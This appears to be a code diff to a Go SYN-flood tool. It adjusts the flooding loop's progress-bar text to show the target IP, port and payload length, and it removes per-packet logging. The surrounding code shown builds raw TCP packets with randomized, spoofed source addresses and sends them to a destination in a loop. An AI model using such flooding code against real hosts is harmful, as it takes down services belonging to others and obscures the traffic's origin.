@@ -1,6 +1,7 @@
 package raw
 
 import (
+	"fmt"
 	"github.com/bilalcaliskan/syn-flood/internal/logging"
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
@@ -35,7 +36,9 @@ func StartFlooding(dstIpStr string, dstPort, payloadLength int) error {
 		}
 	}()
 
-	bar := progressbar.DefaultBytes(-1, "Flood is in progress")
+	description := fmt.Sprintf("Flood is in progress on %s:%d with payload length %d", dstIpStr, dstPort, payloadLength)
+	bar := progressbar.DefaultBytes(-1, description)
+
 	payload := getRandomPayload(payloadLength)
 	srcIps := getIps()
 	srcPorts := getPorts()
@@ -79,6 +82,7 @@ func StartFlooding(dstIpStr string, dstPort, payloadLength int) error {
 		ethernetLayer := buildEthernetPacket(macAddrs[rand.Intn(len(macAddrs))], macAddrs[rand.Intn(len(macAddrs))])
 		tcpPayloadBuf := gopacket.NewSerializeBuffer()
 		pyl := gopacket.Payload(payload)
+
 		if err = gopacket.SerializeLayers(tcpPayloadBuf, opts, ethernetLayer, tcpPacket, pyl); err != nil {
 			return err
 		}
@@ -95,12 +99,6 @@ func StartFlooding(dstIpStr string, dstPort, payloadLength int) error {
 		if err = rawConn.WriteTo(ipHeader, tcpPayloadBuf.Bytes(), nil); err != nil {
 			return err
 		}
-
-		logger.Info("packet sent!", zap.String("srcPort", tcpPacket.SrcPort.String()),
-			zap.String("dstPort", tcpPacket.DstPort.String()),
-			zap.String("srcIp", ipPacket.SrcIP.String()),
-			zap.Uint16("length", ipPacket.Length),
-			zap.String("dstIp", ipPacket.DstIP.String()))
 
 		if err = bar.Add(payloadLength); err != nil {
 			return err
